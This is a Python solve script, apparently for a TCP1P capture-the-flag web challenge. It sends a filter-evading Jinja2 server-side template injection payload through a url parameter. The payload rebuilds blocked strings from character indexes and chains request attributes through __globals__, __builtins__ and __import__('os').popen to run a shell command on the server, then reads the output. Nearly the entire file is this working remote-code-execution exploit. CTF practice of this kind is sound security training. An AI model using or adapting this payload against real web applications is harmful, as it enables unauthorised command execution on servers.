import requests
from bs4 import BeautifulSoup
url = 'http://127.0.0.1:23678/'
# url = 'http://ctf.tcp1p.team:10012'
headers = {
    'Accept-Language': 'en-US',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
    'Accept-Encoding': 'identity',
    'x-csrf-token': 'sad'
}


# Fungsi untuk mencari indeks huruf dalam list
def find_indices_of_letter(letter_list, target_letter):
    return [index for index, letter in enumerate(letter_list) if letter == target_letter]

# List huruf yang ingin diolah
i = ['h', 't', 't', 'p', ':', '/', '/', 'd', 'a', 'f', 'f', 'a', '.', 'i', 'n', 'f', 'o', '.', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '.', 'l', 'o', 'c', 'a', 'l', 't', 'e', 's', 't', '.', 'm', 'e', ':', '1', '3', '3', '7', '/', 's', 'e', 'c', 'r', 'e', 't', '?', 'a', 'd', 'm', 'i', 'n', '=', '{', '%', '2', '5', '%', '2', '0', 'f', 'o', 'r', '%', '2', '0', 'i', '%', '2', '0', 'i', 'n', '%', '2', '0', 'r', 'e', 'q', 'u', 'e', 's', 't', '.', 'u', 'r', 'l', '|', 's', 'l', 'i', 'c', 'e', '(', '1', ')', '%', '2', '0', '%', '2', '5', '}', '{', '{', '%', '2', '0', 'i', '%', '2', '0', '}', '}', '{', '%', '2', '5', '%', '2', '0', 'e', 'n', 'd', 'f', 'o', 'r', '%', '2', '0', '%', '2', '5', '}', '/', 'a', 'b', 'o', 'u', 't', '/']
k = ['b', "'", '_', ' ', '.', '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "'"]

formating = []
inputan = 'ls'

for a in inputan:
    for x in a:
        indices_of_t = find_indices_of_letter(i, x)
        if indices_of_t:
            found = f'i.{indices_of_t[0]}'
        else:
            # Jika tidak ditemukan di 'i', coba cari di 'k'
            indices_of_k = find_indices_of_letter(k, x)
            if indices_of_k:
                found = f'k.{indices_of_k[0]}'
            else:
                continue

        formating.append(found)
        break

formatted_indices = '~'.join([idx for idx in formating])
print(formatted_indices)

payload_start_for_i = '{%\x0afor\x0ai\x0ain\x0arequest.url|slice(1)\x0a%}'
payload_dd = '{%\x0aset\x0add\x0a=\x0ai.21~i.18~i.37~i.18\x0a%}'
payload_start_for_k = '{%\x0afor\x0ak\x0ain\x0arequest|attr(dd)|string|slice(1)\x0a%}'
set_application = '{%\x0aset\x0aa1\x0a=\x0ai.8~i.3~i.3~i.29~i.13~i.20~i.8~i.1~i.13~i.16~i.14%}'
set_globals = '{%\x0aset\x0aa2\x0a=\x0ak.2~k.2~i.24~i.29~i.16~i.19~i.8~i.29~i.36~k.2~k.2%}'
set_getitem = '{%\x0aset\x0aa3\x0a=\x0ak.2~k.2~i.24~i.22~i.1~i.13~i.1~i.22~i.30~k.2~k.2%}'
set_builtins = '{%\x0aset\x0aa4\x0a=\x0ak.2~k.2~i.19~i.38~i.13~i.29~i.1~i.13~i.14~i.36~k.2~k.2%}'
set_import = '{%\x0aset\x0aa5\x0a=\x0ak.2~k.2~i.13~i.30~i.3~i.16~i.35~i.1~k.2~k.2%}'
set_os = '{%\x0aset\x0aa6\x0a=\x0ai.16~i.36%}'
set_popen = '{%\x0aset\x0aa7\x0a=\x0ai.3~i.16~i.3~i.22~i.14%}'
set_cmd = f'{{%\x0aset\x0aa8\x0a=\x0a{formatted_indices}%}}'
set_read = '{%\x0aset\x0aa9\x0a=\x0ai.35~i.22~i.8~i.7%}'
print_dump = "{%print(a8)%}"
print_k = "{%print(request|attr(a1)|attr(a2)|attr(a3)(a4)|attr(a3)(a5)(a6)|attr(a7)(a8)|attr(a9)())%}"
palyoal_end_for_k = '{%\x0aendfor\x0a%}'
palyoal_end_for_i = '{%\x0aendfor\x0a%}'

print(f'{payload_start_for_i}{payload_dd}{payload_start_for_k}{set_application}{set_globals}{set_getitem}{set_builtins}{set_import}{set_os}{set_popen}{set_read}{set_cmd}{print_k}{palyoal_end_for_k}{palyoal_end_for_k}')

payload = f'/?url=.ABCDEFGHIJKLMNOPQRSTUVWXYZ.localtest.me:1337/secret?admin={payload_start_for_i}{payload_dd}{payload_start_for_k}{set_application}{set_globals}{set_getitem}{set_builtins}{set_import}{set_os}{set_popen}{set_read}{set_cmd}{print_k}{palyoal_end_for_k}{palyoal_end_for_k}/about/'
data = '_ .-0123456789'
response = requests.get(url + payload, headers=headers, data=data)
print(response.text)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    title = soup.title.string if soup.title else 'No Title Found'
    print(f"Title: {title}")

    body_text = soup.body.get_text(separator='\n', strip=True) if soup.body else 'No Body Found'
    print("\nBody Text:\n")
    print(body_text)
else:
    print(f"Error: {response.status_code}")